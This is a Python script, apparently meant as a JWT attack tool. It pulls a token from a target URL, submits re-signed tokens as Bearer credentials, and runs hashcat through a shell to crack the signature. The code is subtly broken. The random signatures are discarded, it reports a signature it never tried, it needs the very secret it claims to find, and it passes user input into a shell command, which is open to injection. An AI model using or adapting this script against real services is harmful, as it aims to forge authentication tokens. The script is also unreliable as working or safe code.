import jwt
import requests
import string
import random
import subprocess

# Get user input for the URL, secret key, and dictionary file
url = input("Enter URL: ")
secret_key = input("Enter secret key: ")
dict_file = input("Enter dictionary file path: ")

# Function to generate random strings of a given length
def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# Extract JWT token from the response of the given URL
response = requests.get(url)
jwt_token = response.text.strip()

# Extract the signature from the JWT token
header, payload, signature = jwt_token.split('.')

# Generate a set of random strings of the same length as the signature
random_strings = [generate_random_string(len(signature)) for i in range(10)]

# Try each random string as the new signature and submit the modified JWT token to the URL
for random_string in random_strings:
    new_jwt_token = header + '.' + payload + '.' + random_string
    new_signature = jwt.encode(payload, secret_key, algorithm='HS256')
    new_jwt_token = header + '.' + payload + '.' + new_signature.decode('utf-8')
    response = requests.get(url, headers={'Authorization': 'Bearer ' + new_jwt_token})
    if response.status_code == 200:
        print("Vulnerability found! Signature is ", random_string)
        break
else:
    print("No vulnerability found")

# If the above brute force fails, use hashcat to brute force the token using the specified dictionary file
if response.status_code != 200:
    hashcat_cmd = f"hashcat -a 0 -m 16500 {signature} {dict_file}"
    proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = proc.communicate()
    if "STATUS: CRACKED" in out.decode('utf-8'):
        print("Vulnerability found! Signature is ", out.decode('utf-8').split(':')[-1].strip())
    else:
        print("No vulnerability found")

